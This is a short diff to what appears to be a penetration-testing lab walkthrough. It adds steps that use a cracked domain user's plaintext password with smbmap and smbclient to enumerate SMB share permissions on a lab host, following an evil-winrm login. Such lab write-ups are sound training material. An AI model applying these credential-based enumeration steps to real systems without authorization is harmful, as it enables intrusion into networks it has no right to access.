@@ -103,3 +103,13 @@ or you can use john the reaper so you are sure that the password is the same
 └─$ evil-winrm -i 192.168.56.107 -u jemmie.blondell
 
 After the succest I could check users computer.
+
+# 13) We can alsow check what permisons we have with 
+
+smbmap -H 192.168.56.107  -u "jemmie.blondell" -p winter
+
+now that we have a user 
+
+# 14) we explore and check if any other user has more permisons 
+we can accses that directory with smbclient 
+smbclient //192.168.56.107/ -U "jemmie.blondell"  
